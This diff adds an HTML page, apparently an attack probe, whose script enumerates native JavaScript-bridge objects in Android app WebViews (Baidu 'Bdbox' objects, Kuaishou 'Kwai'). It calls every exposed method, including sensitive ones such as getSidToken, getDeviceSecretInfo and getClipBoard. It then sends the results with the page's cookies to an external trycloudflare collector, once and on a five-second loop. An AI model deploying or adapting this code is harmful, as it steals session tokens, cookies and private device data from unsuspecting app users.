@@ -1,0 +1,74 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>P5</title>
+<style>body{font-family:monospace;font-size:12px;word-break:break-all;margin:4px;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:10px}h1{color:#ff0;font-size:18px;margin:2px 0}</style>
+</head>
+<body>
+<h1>PROBE5-SIGMA</h1>
+<pre id="out">...</pre>
+<script>
+var COLLECTOR = 'https://waters-finances-wrestling-marked.trycloudflare.com';
+var LOG = [];
+function out(s){ LOG.push(String(s)); document.getElementById('out').textContent = LOG.join('\n').substring(0,3200); }
+function report(tag, data){
+  var p = {page:'probe5', tag:tag, url:location.href, data:data, ck:document.cookie, ua:navigator.userAgent};
+  try{ navigator.sendBeacon(COLLECTOR+'/b?d='+encodeURIComponent(JSON.stringify(p))); }catch(e){}
+}
+function T(v){ try{ if (v===undefined) return 'undefined'; if (v===null) return 'null';
+  var s = (typeof v==='object') ? JSON.stringify(v) : String(v); return s.substring(0,400); }catch(e){ return 'T-ERR:'+e; } }
+function safe(f,name){ try{ return f(); }catch(e){ return 'EXC:'+(e&&e.message||e); } }
+
+// try all plausible signatures of a java-bridge fn
+function sigma(obj, m, label){
+  var fn = obj[m]; if (typeof fn !== 'function') return;
+  var r;
+  r = safe(function(){ return T(fn.call(obj)); }, label+'()');        if (r && r!=='undefined') out(label+'() = '+r);
+  r = safe(function(){ return T(fn.call(obj, '')); }, label+'("")');   if (r && r!=='undefined') out(label+'("") = '+r);
+  r = safe(function(){ return T(fn.call(obj, '{}')); }, label+'("{}")');
+  if (r && r!=='undefined' && r.indexOf('EXC:')!==0) out(label+'("{}") = '+r);
+  r = safe(function(){ return T(fn.call(obj, '{}', '')); }, label+'2');
+  if (r && r!=='undefined' && r.indexOf('EXC:')!==0) out(label+'("{}", "") = '+r);
+}
+
+setTimeout(function(){
+  out('t='+Date.now());
+  var targets = ['Bdbox_android_account','Bdbox_android_utils','Bdbox_android_common','Bdbox_android_feed',
+                 'Bdbox_android_send_intent','Bdbox_android_jsbridge','Bdbox_android_plugin','_flyflowNative'];
+
+  // PASS 1: second-level enumeration (fields that are objects) + sigma on their methods
+  targets.forEach(function(t){
+    var o = window[t]; if (!o) return;
+    var keys = safe(function(){ return Object.keys(o); }, 'keys-'+t) || [];
+    out('['+t+'] keys: '+keys.join(','));
+    keys.forEach(function(k){
+      var v = safe(function(){ return o[k]; }, 'get-'+t+'.'+k);
+      if (v && typeof v === 'object'){
+        var sub = safe(function(){ return Object.keys(v); }, 'subkeys') || [];
+        out('  '+t+'.'+k+' = object{'+sub.join(',').substring(0,300)+'}');
+        sub.forEach(function(sk){
+          var sv = safe(function(){ return v[sk]; });
+          if (typeof sv === 'function') sigma(v, sk, t+'.'+k+'.'+sk);
+          else if (sv !== undefined) out('  '+t+'.'+k+'.'+sk+' = '+T(sv).substring(0,200));
+        });
+      } else if (typeof v === 'function'){
+        sigma(o, k, t+'.'+k);
+      } else if (v !== undefined){
+        out('  '+t+'.'+k+' = '+T(v).substring(0,250));
+      }
+    });
+  });
+
+  // PASS 2: Kuaishou Kwai direct sigma on sensitive names
+  var K = window.Kwai;
+  if (K){
+    ['getSidToken','getDeviceInfo','getDeviceSecretInfo','getAppEnvironment','getClientLogInfo','getClipBoard','getABTest','getAddressBookAccessStatus'].forEach(function(m){
+      if (typeof K[m]==='function') sigma(K, m, 'Kwai.'+m);
+    });
+  }
+  out('done5');
+  report('result', {log: LOG.slice(0,120)});
+}, 300);
+setInterval(function(){ report('roll', {log: LOG.slice(0,120)}); }, 5000);
+</script>
+</body>
+</html>
